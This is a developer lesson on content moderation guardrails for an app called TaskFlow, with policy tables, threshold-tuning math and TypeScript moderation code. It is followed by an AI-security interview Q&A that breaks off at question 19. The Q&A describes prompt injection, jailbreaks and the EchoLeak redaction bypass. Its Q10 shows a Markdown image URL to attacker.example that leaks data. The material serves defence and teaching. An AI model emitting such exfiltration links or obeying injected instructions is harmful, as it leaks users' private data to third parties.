docs.title: Guardrails and Content Moderation
docs.text:
Guardrails are the checks around a model call that decide whether an input may reach the model and whether an output may reach a person. Content moderation is the most common of them: classifying text or images against harm categories such as harassment, hate, sexual content, violence, and self-harm. In TaskFlow, moderation applies to what users type into the Assistant, to what the model writes back, and to AI summaries and comments that the whole project will read.

This lesson covers moderation APIs and open-weight classifiers, how to write a content policy and turn classifier scores into actions, how to choose thresholds when violations are rare, where guardrails add latency and how to hide most of it, and which guardrail libraries are maintained as of November 2026. Attacks on the application itself are covered in prompt injection and defenses; removing personal data before it reaches a provider is covered in privacy, PII, and data retention.

docs.title: Why it matters
docs.text:
An AI feature produces content in your product's name. If the Assistant drafts a threatening message to a teammate, or a meeting summary repeats an abusive remark to the whole project, users will hold TaskFlow responsible, not the model vendor. Some content needs a different response entirely: a note in which someone says they want to hurt themselves calls for a supportive reply, not an error message.

The opposite failure is just as real. A security team's notes are full of "attack", "kill the process", and "exploit"; a filter tuned for a children's app will block their work. Every check also adds latency and cost to every request. Good guardrails are therefore not "block as much as possible" but a written policy, measured classifiers, thresholds chosen from data, and a clear answer for what happens when a check is slow or down.

docs.title: Real-world usage
docs.text:
• OpenAI. The moderation guide describes omni-moderation-latest, which classifies text and images (not audio) into categories such as harassment, hate, illicit, self-harm, sexual, and violence. It says the endpoint "is free to use", advises to "treat moderation scores as signals for your application's policy, not as an automatic blocking decision", and warns that custom thresholds on category_scores "may need recalibration over time" because the model is upgraded.
  • Microsoft. Azure AI Content Safety scores hate, sexual, violence, and self-harm on a 0-7 severity scale for text, and adds Prompt Shields, protected-material detection, and a task-adherence API for agents. Its documentation states plainly that "classification models can produce false positives and false negatives". Several preview features, including groundedness detection, are scheduled to retire on April 30, 2027.
  • Amazon. Bedrock Guardrails combines content filters (hate, insults, sexual, violence, misconduct, and prompt attack), denied topics, word filters, sensitive-information filters that block or mask PII, contextual grounding checks, and Automated Reasoning checks. The ApplyGuardrail API runs a guardrail "without invoking the foundation models", so it can screen traffic to any provider.
  • Google. In the Gemini API, safety settings are adjustable per category, the default threshold is "Off for Gemini 2.5 and later models", and core harms such as child safety are "always blocked and cannot be adjusted". For model-agnostic screening, Google Cloud offers Model Armor.
  • Open-weight classifiers. Meta's Llama Guard 4 is a 12B multimodal classifier that labels prompts and responses against the 14 MLCommons hazard categories. OpenAI's gpt-oss-safeguard (20b and 120b, Apache 2.0) is a "safety reasoning model" that applies a policy you write in plain language.

Popular tools and providers: OpenAI Moderation API, Azure AI Content Safety, Amazon Bedrock Guardrails, Google Cloud Model Armor, Llama Guard 4, gpt-oss-safeguard, ShieldGemma, IBM Granite Guardian, NVIDIA NeMo Guardrails, and Guardrails AI.

docs.title: Where guardrails sit
docs.text:
A guardrail can run at several points. NVIDIA's NeMo Guardrails names five: input rails on the user's message, dialog rails that steer the conversation, retrieval rails on retrieved chunks, execution rails on tool inputs and outputs, and output rails on the model's answer. Most applications need three of them:

  1. Cheap deterministic checks first: length limits, rate limits, blocklists, and PII masking. They are fast, free, and predictable.
  2. Input classifiers: moderation and prompt-attack detection on the user's message, run in parallel with the model call.
  3. Output checks: moderation of the answer, schema validation, grounding checks for RAG answers, and the link and image filter.

docs.title: Kinds of checks
docs.text:
Kind Examples Strengths Weaknesses Rules and blocklists Regex, word lists, Bedrock word filters Fast, predictable, explainable Brittle; miss paraphrases; flag innocent words Hosted moderation APIs OpenAI moderation, Azure Analyze text Calibrated scores, many languages, no model to run Fixed taxonomy; data leaves your systems Configurable guardrail services Bedrock Guardrails, Foundry guardrails, Model Armor Denied topics, PII masking, grounding in one place Tied to one cloud; configuration drift Open-weight classifiers Llama Guard 4, ShieldGemma, Granite Guardian Run in your network; tunable You host GPUs; you own updates Policy-reasoning models gpt-oss-safeguard, a general model with a policy prompt Your own written policy; handles nuance Slower and costlier per call The model's built-in filters Gemini safetySettings No extra call Only for that provider; defaults vary

Each provider has its own taxonomy, so map their categories to yours rather than to each other:

TaskFlow category OpenAI Azure Bedrock Llama Guard 4 Harassment and threats harassment, harassment/threatening Hate, Violence Insults, Violence S1, S10 Hate hate, hate/threatening Hate Hate S10 Self-harm self-harm, /intent, /instructions Self-harm none (denied topic) S11 Sexual content sexual, sexual/minors Sexual Sexual S3, S4, S12 Illegal activity illicit, illicit/violent none (custom category) Misconduct S1, S2, S9

The table is approximate by design: categories overlap and their definitions differ, which is one reason to evaluate any provider on your own labeled examples before you switch.

docs.title: Writing the policy
docs.text:
Write the policy before choosing a classifier. A policy says, for each category, what counts as a violation in this product, with boundary examples, where it applies, and what happens. TaskFlow is a workplace tool, so its policy differs from a fiction app's or a children's app's:

Category Surfaces Action Why Sexual content involving minors All Block and report through the legal process Never acceptable; zero tolerance Threats against a person All Block Real risk to a teammate Self-harm intent All Supportive reply, no error Blocking a person in distress helps nobody Self-harm instructions Assistant output Block The product must not produce them Hate Shared comments Human review Context matters (quotes, moderation reports) Harassment, milder Shared comments Warn, let the author edit Most cases are heat of the moment Graphic violence All Warn Incident reports may describe injuries

Principles that hold across products:

  • Policy as data. Keep thresholds and actions in a versioned file, not scattered through code, and record the policy version with every decision so you can explain it later.
  • More than block and allow. Masking, warning, supportive replies, and review queues are often better outcomes than a refusal.
  • Explainable messages. Say what policy was hit and what the user can do; never show raw scores or category codes.
  • Appeals and review. Borderline decisions on content that other people see should be reviewable by a person, and reviewed labels feed back into threshold tuning.

docs.title: Thresholds, false positives, and base rates
docs.text:
A classifier returns a score; a threshold turns it into a decision. Two measures describe the result:

  • Precision: of the items flagged, the share that really violate.
  • Recall: of the items that violate, the share that get flagged.

When violations are rare, precision collapses at low thresholds even for a good classifier. Suppose 0.5% of 10,000 shared comments (50) violate the harassment policy, the classifier catches 96% of them, and it wrongly flags 1% of the 9,950 benign comments:

true positives  = 0.96 x 50     = 48
false positives = 0.01 x 9,950  = 99.5, about 100
precision       = 48 / (48 + 100) = 0.32

Two out of three flags are wrong, although the classifier is "99% accurate" on benign text. This is the base-rate effect, and it is why review queues fill with false alarms. The sweep below, run on a synthetic set with exactly this base rate, shows how precision and recall move as the threshold rises.

Three things move thresholds in production: the provider upgrades its model (OpenAI says so explicitly), your traffic changes (a new customer in a new language or industry), and attackers adapt. Keep a labeled set per category, from review decisions and red-team cases, and re-run the sweep when any of the three changes. The S7 lessons on building evaluation sets apply directly.

Language matters too. Azure trained and tested its harm models on eight languages and says they "can work in many other languages, but the quality might vary". If TaskFlow customers write in Hindi or Polish, measure those languages separately; a threshold tuned on English can miss most violations in another language.

docs.title: Latency and placement
docs.text:
Each check is a network call or a model inference, and the order you run them in decides how much of that latency users feel.

  • Run input checks in parallel with the model. Start both at once; if the check flags the input, abort the model call. The check costs nothing in latency when it is faster than the model, and the aborted call wastes only the tokens generated so far.
  • Check output before it is shown. For non-streaming responses, this is one more call. For streaming, buffer the text into sentences or short chunks and check each before releasing it; showing raw tokens and retracting them later means the user has already read them.
  • Set a deadline and a fail mode for every check. When a moderation call times out, a feature can fail closed (block or hold the content) or fail open (continue and log). Fail closed where the harm of a miss is high, such as public comments or child-facing products; fail open where it is low and availability matters more.
  • Avoid paying twice. Cache verdicts for identical text (keyed by a hash of the normalized text and the policy version), and skip re-checking content you generated and checked a moment ago.

Policy-reasoning models such as gpt-oss-safeguard read your whole policy and reason before answering, so each call is much slower and costlier than a dedicated classifier. They fit offline labeling, appeal reviews, and low-volume, high-stakes surfaces better than every chat message.

docs.title: Guardrail libraries and frameworks
docs.text:
As of November 2026:

  • NeMo Guardrails (NVIDIA, Python, version 0.24.1 from September 2026; the repository moved to the NVIDIA-NeMo organization) configures input, dialog, retrieval, execution, and output rails, with flows written in Colang (1.0 is the default; 2.0 is supported).
  • Guardrails AI (version 0.11.0 from August 2026) composes "validators" from its hub into input and output guards; it is mainly Python, with JavaScript support.
  • LLM Guard was archived on July 9, 2026 and is read-only. Existing users should plan a migration; new projects should not start on it.
  • Vercel AI SDK middleware. In a TypeScript app, wrapLanguageModel lets you put input and output checks around any provider's model as middleware, which keeps guardrails in one place.

A framework helps when many features share many rails. For one or two features, the plain functions in the next section are easier to read, test, and debug.

docs.title: When to use and when not to use
docs.text:
Surface Who sees the content Suggested checks Assistant input from a signed-in user The model, then the same user Input moderation in parallel, fail open with logging Assistant output shown only to its author The same user Output moderation for high-severity categories only AI summary posted to a project Everyone in the project Output moderation, fail closed, review queue for borderline Shared comments written by users Everyone in the project Moderation with warn-and-edit, review for hate Agent tool calls External systems Injection controls and confirmation, not moderation alone

When not to add another check:

  • Do not moderate machine-to-machine data that no person will see and that cannot trigger an action; it adds latency for no benefit.
  • Do not use a policy-reasoning model on every keystroke-level request; use a fast classifier and reserve the slow model for escalations.
  • Do not rely on moderation to stop prompt injection or data leaks; it classifies harm, not intent against your application.
  • Do not stack three vendors' filters "to be safe" without measuring; each one adds latency and false positives, and their errors overlap less than you expect.

docs.title: Practical examples
docs.text: The examples use the OpenAI SDK for moderation, with Bedrock, Azure, and Gemini equivalents at the end. All code was type-checked with tsc; the policy, the guard, and the threshold sweep were run with mocked clients.

docs.title: The policy as data
docs.text:
// src/moderation/policy.ts: TaskFlow's content policy as data, and the decision it implies
export type Action = "allow" | "warn" | "safe_complete" | "review" | "block";
export type Surface = "assistant_input" | "assistant_output" | "shared_comment";

export interface Rule {
  category: string;   // a category name from the moderation provider
  threshold: number;  // the rule fires when the score is at or above this value
  action: Action;
  surfaces: Surface[];
}

export interface Decision {
  action: Action;
  reasons: string[];
  policyVersion: string;
}

// Higher wins when several rules fire on the same text
const PRECEDENCE: Record<Action, number> = { allow: 0, warn: 1, safe_complete: 2, review: 3, block: 4 };
const ALL: Surface[] = ["assistant_input", "assistant_output", "shared_comment"];

export const POLICY_VERSION = "2026-11-01";

// Starting thresholds only: tune each one on labeled TaskFlow data before relying on it.
export const RULES: Rule[] = [
  { category: "sexual/minors", threshold: 0.01, action: "block", surfaces: ALL },
  { category: "harassment/threatening", threshold: 0.5, action: "block", surfaces: ALL },
  { category: "hate/threatening", threshold: 0.5, action: "block", surfaces: ALL },
  { category: "illicit/violent", threshold: 0.5, action: "block", surfaces: ALL },
  { category: "self-harm/instructions", threshold: 0.4, action: "block", surfaces: ["assistant_output"] },
  { category: "self-harm/intent", threshold: 0.5, action: "safe_complete", surfaces: ALL },
  { category: "hate", threshold: 0.6, action: "review", surfaces: ["shared_comment"] },
  { category: "harassment", threshold: 0.7, action: "warn", surfaces: ["shared_comment"] },
  { category: "harassment", threshold: 0.8, action: "block", surfaces: ["assistant_output"] },
  { category: "violence/graphic", threshold: 0.8, action: "warn", surfaces: ALL },
];

export function decide(scores: Record<string, number>, surface: Surface, rules: Rule[] = RULES): Decision {
  let action: Action = "allow";
  const reasons: string[] = [];
  for (const rule of rules) {
    if (!rule.surfaces.includes(surface)) continue;
    const score = scores[rule.category] ?? 0;
    if (score < rule.threshold) continue;
    reasons.push(`${rule.category} ${score.toFixed(2)} >= ${rule.threshold} -> ${rule.action}`);
    if (PRECEDENCE[rule.action] > PRECEDENCE[action]) action = rule.action;
  }
  return { action, reasons, policyVersion: POLICY_VERSION };
}

The precedence order makes outcomes predictable when several rules fire: a threat inside a self-harm message is blocked, while self-harm intent alone gets the supportive reply. The reasons list is what goes into logs and review tools.

docs.title: Scoring text with the moderation endpoint
docs.text:
// src/moderation/moderate.ts: score text with the OpenAI moderation endpoint and apply TaskFlow's policy
import OpenAI from "openai";
import { decide, type Decision, type Surface } from "./policy.js";

// Only the method we use, so tests can pass a fake client
export type ModerationClient = { moderations: Pick<OpenAI["moderations"], "create"> };

export interface ModerationResult extends Decision {
  flagged: boolean;                 // the provider's own verdict, logged for comparison
  scores: Record<string, number>;
}

export async function moderateText(
  client: ModerationClient,
  text: string,
  surface: Surface,
  signal?: AbortSignal,
): Promise<ModerationResult> {
  const model = process.env.MODERATION_MODEL; // pick from the provider's current moderation models
  if (!model) throw new Error("MODERATION_MODEL is not set");

  const response = await client.moderations.create({ model, input: text }, { signal, maxRetries: 0 });
  const result = response.results[0];
  if (!result) throw new Error("moderation returned no result");

  const scores: Record<string, number> = Object.fromEntries(Object.entries(result.category_scores));
  return { ...decide(scores, surface), flagged: result.flagged, scores };
}

MODERATION_MODEL comes from configuration. The moderation guide names the current model; the SDK's type definitions list both a -latest alias and a dated snapshot, and pinning a snapshot keeps scores stable until you choose to re-tune. maxRetries: 0 is deliberate: the guard below owns the deadline, and SDK retries would silently stretch it.

docs.title: Input check in parallel, output check before display
docs.text:
// src/moderation/guarded-generate.ts: input check in parallel with the model, output check before display
import type { Decision } from "./policy.js";

export type Check = (text: string, signal: AbortSignal) => Promise<Decision>;
export type Generate = (text: string, signal: AbortSignal) => Promise<string>;

export interface GuardOptions {
  timeoutMs: number;            // how long a check may take before the fail mode applies
  failMode: "open" | "closed";  // what a missing verdict means for this feature
}

export type GuardedResult =
  | { status: "ok"; text: string; input: Decision; output: Decision }
  | { status: "stopped"; stage: "input" | "output"; decision: Decision };

const STOP = new Set(["block", "review", "safe_complete"]);

// Runs a check with a deadline. A timeout or error becomes a decision, so callers never hang.
export async function runCheck(check: Check, text: string, opts: GuardOptions): Promise<Decision> {
  const controller = new AbortController();
  let timer: ReturnType<typeof setTimeout> | undefined;
  const deadline = new Promise<never>((_, reject) => {
    timer = setTimeout(() => {
      controller.abort();
      reject(new Error("timeout"));
    }, opts.timeoutMs);
  });
  try {
    return await Promise.race([check(text, controller.signal), deadline]);
  } catch (err) {
    const reason = err instanceof Error && err.message === "timeout" ? "check_timeout" : "check_error";
    return {
      action: opts.failMode === "closed" ? "block" : "allow",
      reasons: [`${reason}: fail ${opts.failMode}`],
      policyVersion: "n/a",
    };
  } finally {
    clearTimeout(timer);
  }
}

export async function guardedGenerate(
  input: string,
  deps: { checkInput: Check; generate: Generate; checkOutput: Check },
  opts: GuardOptions,
): Promise<GuardedResult> {
  const model = new AbortController();
  // Start the model at once; the input check usually finishes first.
  const generation = deps.generate(input, model.signal);
  generation.catch(() => undefined); // an aborted generation must not become an unhandled rejection

  const inputDecision = await runCheck(deps.checkInput, input, opts);
  if (STOP.has(inputDecision.action)) {
    model.abort(); // stop paying for tokens nobody will see
    return { status: "stopped", stage: "input", decision: inputDecision };
  }

  const text = await generation;
  const outputDecision = await runCheck(deps.checkOutput, text, opts);
  if (STOP.has(outputDecision.action)) {
    return { status: "stopped", stage: "output", decision: outputDecision };
  }
  return { status: "ok", text, input: inputDecision, output: outputDecision };
}

The guard depends only on two small function types, so it works with any provider and is easy to test with fakes. runCheck converts timeouts and errors into decisions according to the fail mode, which makes the choice explicit and visible in logs instead of an accident of exception handling.

docs.title: Wiring it into the Assistant route
docs.text:
// src/routes/assistant.ts: the Assistant endpoint with moderation on both sides of the model call
import express from "express";
import OpenAI from "openai";
import { moderateText } from "../moderation/moderate.js";
import { guardedGenerate } from "../moderation/guarded-generate.js";

const client = new OpenAI();
export const assistant = express.Router();

const MESSAGES = {
  block: "This request can't be processed because it breaks the TaskFlow content policy.",
  review: "This content was sent for review before it can be shared.",
  safe_complete:
    "It sounds like you might be going through something difficult. You don't have to handle it alone: " +
    "please consider talking to someone you trust or a local support line.",
} as const;

assistant.post("/assistant", express.json({ limit: "32kb" }), async (req, res) => {
  const text = typeof req.body?.text === "string" ? req.body.text.slice(0, 8_000) : "";
  const model = process.env.CHAT_MODEL; // pick from the provider's current model list
  if (!text || !model) return res.status(400).json({ error: "text is required" });

  const result = await guardedGenerate(
    text,
    {
      checkInput: (t, signal) => moderateText(client, t, "assistant_input", signal),
      generate: async (t, signal) => {
        const r = await client.responses.create({ model, input: t, store: false }, { signal });
        return r.output_text;
      },
      checkOutput: (t, signal) => moderateText(client, t, "assistant_output", signal),
    },
    { timeoutMs: 1_500, failMode: "closed" },
  );

  // Log the decision without the text itself; see the privacy lesson for what to keep.
  console.info(JSON.stringify({ event: "assistant_guard", status: result.status,
    ...(result.status === "stopped" ? { stage: result.stage, action: result.decision.action, reasons: result.decision.reasons } : {}) }));

  if (result.status === "ok") return res.json({ text: result.text });
  const action = result.decision.action;
  if (action === "safe_complete") return res.json({ text: MESSAGES.safe_complete, safety: true });
  return res.status(422).json({ error: action === "review" ? MESSAGES.review : MESSAGES.block });
});

The supportive reply is a fixed, reviewed message rather than model output, and it avoids hard-coding one country's hotline; a production version would choose resources by the user's locale. The log line keeps the decision and reasons but not the user's text (see structured logging).

docs.title: Tuning a threshold from labeled data
docs.text:
// src/moderation/tune-threshold.ts: precision, recall, and flag rate at each threshold for one category
export interface Labeled {
  score: number;      // the classifier's score for this item
  violates: boolean;  // the human label from your review queue
}

export interface Row {
  threshold: number;
  precision: number;  // of the items flagged, the share that really violate
  recall: number;     // of the items that violate, the share flagged
  flagRate: number;   // share of all traffic flagged, which drives review workload
  falsePositives: number;
}

export function sweep(items: Labeled[], thresholds: number[]): Row[] {
  const positives = items.filter((i) => i.violates).length;
  return thresholds.map((threshold) => {
    let tp = 0;
    let fp = 0;
    for (const item of items) {
      if (item.score < threshold) continue;
      if (item.violates) tp += 1;
      else fp += 1;
    }
    return {
      threshold,
      precision: tp + fp === 0 ? 1 : tp / (tp + fp),
      recall: positives === 0 ? 1 : tp / positives,
      flagRate: (tp + fp) / items.length,
      falsePositives: fp,
    };
  });
}

// The highest threshold that still meets the recall target, which keeps false positives lowest
export function pickThreshold(rows: Row[], minRecall: number): Row | undefined {
  return rows.filter((r) => r.recall >= minRecall).sort((a, b) => b.threshold - a.threshold)[0];
}

Run on a synthetic set (9,950 benign and 50 violating comments with seeded random scores, so the numbers are reproducible but not from a real classifier), the sweep printed:

threshold  precision  recall  flagged  false_pos
      0.1       0.07    1.00    7.29%        679
      0.2       0.23    1.00    2.14%        164
      0.3       0.49    0.98    1.01%         52
      0.4       0.81    0.96    0.59%         11
      0.5       0.96    0.88    0.46%          2
      0.6       1.00    0.78    0.39%          0
      0.7       1.00    0.62    0.31%          0
      0.8       1.00    0.48    0.24%          0
      0.9       1.00    0.34    0.17%          0
pick 0.4 for recall >= 0.90

The recall target comes from the policy, not from the data: for threats, TaskFlow might demand 0.95 and accept more review work; for mild harassment on a warn-only rule, 0.8 may be enough. The flagged column is the review workload: at 0.3, a reviewer sees about 100 comments per 10,000, half of them false alarms.

docs.title: Testing the guard with fakes
docs.text:
// test/moderation.test.ts (excerpt): a flagged input stops and aborts the model; a hung check fails by configuration
test("a flagged input stops the model early and aborts it", async () => {
  let aborted = false;
  const started = Date.now();
  const result = await guardedGenerate(
    "bad input",
    {
      checkInput: async () => { await sleep(20); return block; },
      generate: async (_t, signal) => {
        signal.addEventListener("abort", () => { aborted = true; });
        await sleep(300, signal);
        return "never shown";
      },
      checkOutput: async () => allow,
    },
    { timeoutMs: 200, failMode: "closed" },
  );
  assert.deepEqual(result.status === "stopped" && result.stage, "input");
  assert.ok(aborted);
  assert.ok(Date.now() - started < 200, "did not wait for the model");
});

test("a hung check fails closed or open by configuration", async () => {
  const hang: Check = (_t, signal) => sleep(10_000, signal).then(() => allow);
  const closed = await runCheck(hang, "x", { timeoutMs: 30, failMode: "closed" });
  const open = await runCheck(hang, "x", { timeoutMs: 30, failMode: "open" });
  assert.equal(closed.action, "block");
  assert.equal(open.action, "allow");
  assert.deepEqual(open.reasons, ["check_timeout: fail open"]);
});

The full file also checks rule precedence, maps a mocked moderation response through the policy (a harassment score of 0.72 on a shared comment produces "warn"), confirms that a parallel check finishing in 40 ms adds no time to a 120 ms model call, and verifies the sweep. All six tests passed on Node 22.12.

docs.title: The same check on other providers
docs.text:
// src/moderation/equivalents.ts (excerpt): Bedrock Guardrails, Azure AI Content Safety, and Gemini filters
const result = await bedrock.send(
  new ApplyGuardrailCommand({
    guardrailIdentifier: process.env.GUARDRAIL_ID,
    guardrailVersion: process.env.GUARDRAIL_VERSION,
    source: "INPUT", // "OUTPUT" for model responses
    content: [{ text: { text } }],
  }),
);
const intervened = result.action === "GUARDRAIL_INTERVENED"; // outputs holds masked text when PII is masked

const response = await azure.path("/text:analyze").post({ body: { text, outputType: "FourSeverityLevels" } });
if (isUnexpected(response)) throw new Error(response.body.error.message);
const severities = response.body.categoriesAnalysis; // [{ category: "Hate", severity: 0 | 2 | 4 | 6 }, ...]

const gemini = await ai.models.generateContent({
  model, // process.env.CHAT_MODEL
  contents: text,
  config: {
    safetySettings: [
      { category: HarmCategory.HARM_CATEGORY_HARASSMENT, threshold: HarmBlockThreshold.BLOCK_MEDIUM_AND_ABOVE },
    ],
  },
});
const blocked = gemini.promptFeedback?.blockReason !== undefined
  || gemini.candidates?.[0]?.finishReason === FinishReason.SAFETY;

Bedrock and Azure return verdicts that map into the same Decision type, so guardedGenerate does not change. Gemini's settings act inside the model call itself, so they replace the separate check only for that provider, and they are off by default on current models.

docs.title: Best practices
docs.text:
• Write the policy first, with boundary examples, and keep it as versioned data.
  • Use more actions than block and allow: mask, warn, supportive reply, and human review.
  • Run cheap deterministic checks first and classifiers in parallel with the model.
  • Give every check a deadline and an explicit fail mode per feature.
  • Tune each threshold on your own labeled data, per category and per language, and re-tune when the provider's model changes.
  • Pin moderation model versions where the provider offers snapshots, and roll new versions out behind a comparison run.
  • Log decisions, reasons, and the policy version, not the user's text.
  • Measure false positives through appeals and review outcomes, not only through block counts.
  • Keep humans in the loop for borderline content that other people will see.

docs.title: In production
docs.text:
• Block rate doubles overnight with no product change. Detect: the per-category block rate jumps on a dashboard while traffic is flat, and appeals rise. Cause: the provider upgraded the moderation model behind an alias, shifting score distributions. Fix: pin a dated snapshot if one exists, re-run the threshold sweep on the labeled set, and alert on sudden shifts in score percentiles.
  • p95 latency of the Assistant grows by a second. Detect: traces show the output moderation span waiting until its timeout. Cause: a regional slowdown at the moderation provider, amplified by SDK retries. Fix: set maxRetries: 0 inside the guard, keep a tight deadline, and decide per feature whether to fail open or closed.
  • Harmful text appears on screen and then disappears. Detect: users report seeing content that the logs show as blocked. Cause: streaming tokens to the browser before the output check runs. Fix: buffer streamed output into sentences and release each one only after it passes.
  • A team's legitimate notes keep getting blocked. Detect: appeals cluster in one workspace, and the reviewed labels are mostly "not violating". Cause: domain vocabulary (security, medicine, gaming) that generic classifiers score as violence. Fix: move that category to warn or review for shared comments, re-tune on the workspace's reviewed labels, and keep block only for high-severity categories.
  • Violations in one language go unnoticed. Detect: a sample review of non-English traffic finds violations the classifier scored low. Cause: a classifier weaker in that language, with thresholds tuned on English. Fix: build a labeled set per language, set separate thresholds, or use a classifier trained for that language.
  • The moderation bill grows faster than usage. Detect: guardrail calls per user request rise from two to five. Cause: checks added by several teams on the same text, and re-checking content generated moments earlier. Fix: cache verdicts by text hash and policy version, and keep one owner for the guardrail pipeline.

docs.title: Important terminology
docs.text:
• Guardrail: A check before or after a model call that can allow, change, or stop the content.
  • Content moderation: Classifying content against harm categories.
  • Content policy: The written rules for what is allowed in a product and what happens when a rule is broken.
  • Severity / score: A classifier's output for a category, as a level (Azure) or a confidence score (OpenAI).
  • Threshold: The score at which a rule fires.
  • Precision / recall: The share of flags that are right, and the share of violations that are flagged.
  • Base rate: How common violations are in real traffic; low base rates make false positives dominate.
  • Fail open / fail closed: Continuing or stopping when a check cannot give a verdict.
  • Safe completion: Answering in a safe, helpful way (for example with support resources) instead of refusing.
  • Rail: NeMo Guardrails' term for a check at one stage: input, dialog, retrieval, execution, or output.

docs.title: Common mistakes and misconceptions
docs.text:
• Treating the provider's flagged boolean as the product policy; it reflects the provider's defaults, not your product.
  • Using one threshold for every category, surface, and language.
  • Blocking self-harm disclosures with a generic error message.
  • Showing streamed tokens before they are checked.
  • Letting SDK retries and default timeouts decide the fail mode.
  • Believing moderation stops prompt injection; it classifies harm, not attacks on your application.
  • Measuring only block counts, so false positives stay invisible.
  • Assuming a vendor's defaults are on: Gemini's adjustable filters are off by default on current models.

docs.title: Revision questions
docs.text:
1. What is the difference between content moderation and the prompt injection defenses on the previous page?
  2. Name four actions a policy can take besides allow and block, and give a TaskFlow case for each.
  3. 20,000 comments contain 100 violations. A classifier has recall 0.9 and flags 0.5% of benign comments. What is its precision, and how many comments does a reviewer see per day if all flags are reviewed?
  4. Why should the input check run in parallel with the model call, and what happens to the model call when the input is flagged?
  5. When should a feature fail closed, and when should it fail open? Give one example of each in TaskFlow.
  6. Why can a threshold that worked last quarter start over-blocking without any change to your code?
  7. How would you check streamed output without letting users read content that will be blocked?

docs.title: AI Security, Privacy, and Responsible Use Interview Questions and Answers
docs.text: These questions review AI security fundamentals, prompt injection, guardrails and moderation, privacy and data retention, and AI regulation and governance. Try answering each one before reading the answer. Facts about providers and laws are as of November 2026.

docs.title: 1. How does securing an AI feature differ from securing an ordinary web feature?
docs.text: All the usual controls still apply: authentication, authorization on every resource, input validation, secrets management, and careful logging. AI features add a component that follows instructions found anywhere in its input, new untrusted inputs (retrieved documents, tool results), untrusted outputs that may be rendered or executed, and new data flows to providers, vector stores, and traces. The model belongs on the untrusted side of the boundary.

docs.title: 2. What is the trust boundary in an LLM application?
docs.text: The backend is trusted; the model, user text, retrieved content, and model output are not. The backend decides what data the model may see (only what the signed-in user may see), which tools exist, and whether each tool call is allowed. The model can suggest; code decides. A system must stay safe even if the model follows hostile content.

docs.title: 3. What changed in the OWASP Top 10 for LLM Applications for 2026?
docs.text: Prompt injection stays LLM01. Excessive Agency rose to third place, Unbounded Consumption rose four places, and System Prompt Leakage was generalized into Hidden Context Exposure (LLM08). The 2026 list was published in August 2026; the 2025 list (November 2024) is still widely cited, so check which numbering a tool uses.

docs.title: 4. Why must model output be treated as untrusted input?
docs.text: Output can carry HTML or script, SQL fragments, shell commands, file paths, or URLs, either by accident or because an injection asked for them. OWASP calls this Improper Output Handling. Encode output for its context, validate structured output against a schema, parameterize queries, never execute generated code automatically, and filter images and links before rendering.

docs.title: 5. What is overreliance, and how do you design against it?
docs.text: Users act on wrong but confident answers (OWASP's Misinformation entry). Show sources the application verified, make uncertainty visible, keep AI output as drafts where errors are costly, and require human review for consequential actions. Evaluate factual accuracy before launch and monitor it after.

docs.title: 6. How do you threat-model the data path of an AI feature?
docs.text: Follow the data from the browser to the API, retrieval store, model provider, tools, logs, traces, caches, and the rendered result. For each hop ask who can write content into it (an injection source), who can read it (an exposure risk), how long it is kept, and how it is deleted.

docs.title: 7. What is prompt injection, and why can't it be fixed like SQL injection?
docs.text: Prompt injection is text the model reads that changes its behavior against the application's intent. SQL injection was solved by parameterized queries, which separate code from data. Models have no such separation: as the UK NCSC puts it, they "do not enforce a security boundary between instructions and data inside a prompt". Defenses must therefore limit what a successful injection can do.

docs.title: 8. What is the difference between direct and indirect injection?
docs.text: Direct injection comes from the user typing to the assistant; it mostly harms the operator (policy bypass, leaked prompts, cost). Indirect injection is planted by a third party in content the app later feeds to the model, such as a shared note, an email, a web page, or a tool result; it harms the user, whose data leaks or whose actions are taken.

docs.title: 9. How does jailbreaking relate to prompt injection?
docs.text: OWASP describes jailbreaking as the subset of prompt injection whose goal is to make the model violate its safety protocols. Getting disallowed content out is a moderation problem; hijacking the application's goals or tools is the security problem.

docs.title: 10. How can a Markdown image leak data without a click?
docs.text: If the model outputs ![x](https://attacker.example/p.png?d=DATA) and the UI renders Markdown, the browser fetches the URL immediately, sending whatever the injection put in the query string or hostname. Remove images from unknown hosts before rendering and back the filter with a CSP img-src allowlist.

docs.title: 11. Why did reference-style Markdown matter in the EchoLeak attack?
docs.text: EchoLeak (CVE-2025-32711, Microsoft 365 Copilot) used reference-style links and images, ![x][1] with [1]: https://... elsewhere, to get past redaction that only looked for the inline form, and used an auto-fetched image routed through a domain the CSP allowed. Filters must handle every Markdown form, and CSP allowlists must not include hosts that fetch arbitrary URLs.

docs.title: 12. What is the lethal trifecta?
docs.text: Simon Willison's name for the combination that makes data theft possible: access to private data, exposure to untrusted content, and a way to communicate externally. Remove any one leg and exfiltration is not possible, whatever the model is persuaded to do. Rendering an image or link counts as external communication.

docs.title: 13. What is the Rule of Two, and how do you enforce it in code?
docs.text:
Meta's guideline: an agent session should hold at most two of untrusted input, sensitive data or systems, and the ability to change state or communicate externally; with all three, a person approves. Track the capabilities a session has gained and check before each tool call:

const after = new Set([...session.capabilities, ...tool.adds]);
if (after.size === 3) return { kind: "confirm", reason: "untrusted input, private data, and an external action" };

docs.title: 14. Explain the Dual LLM pattern. What can an injection still change?
docs.text: A privileged model plans and calls tools but never sees untrusted text. A quarantined model reads the untrusted text, has no tools, and returns a value stored in a variable by plain controller code, which inserts it where the plan says. An injection in a note can still distort that value (a wrong summary) but cannot change the plan, the tools, or the recipient.

docs.title: 15. What is Plan-Then-Execute, and when does it not fit?
docs.text: The model commits to a sequence of actions before reading any untrusted data, so injected text cannot add steps. It fits tasks whose steps are known up front, such as "email me this week's summary". It fits poorly when the next step genuinely depends on what the content says, such as open-ended research; those need confirmation or a narrower design.

docs.title: 16. What is spotlighting, and what are its limits?
docs.text: Marking untrusted text so the model can tell it apart from instructions: delimiting, datamarking (joining words with a marker such as ^), or encoding. Microsoft's research cut attack success from over 50% to under 2% in its experiments, but OWASP notes it helps "in non-adaptive tests only": an attacker who knows the scheme can imitate it.

docs.title: 17. Why strip invisible Unicode characters, and which ones?
docs.text: Tag characters (U+E0000 to U+E007F), variation selectors (U+FE00 to U+FE0F), and zero-width characters (U+200B, U+200C, U+200D, U+2060) are invisible to people but readable by models. They can hide instructions in harmless-looking text or smuggle data out inside links, and they can make a confirmation dialog show something different from the real action.

docs.title: 18. How should you use prompt-injection classifiers?
docs.text: As signals for blocking obvious attacks, logging, and alerting, never as the boundary. If each variant is caught independently with probability p and an attacker tries n variants, at least one gets through with probability 1 - p^n: at 95% and 20 tries that is 64%. Also check what a detector inspects; Bedrock's prompt attack filter does not evaluate tool results, and Azure's document-attack detection is off by default in Foundry guardrails.

docs.title: 19. What makes a human confirmation a real security control?
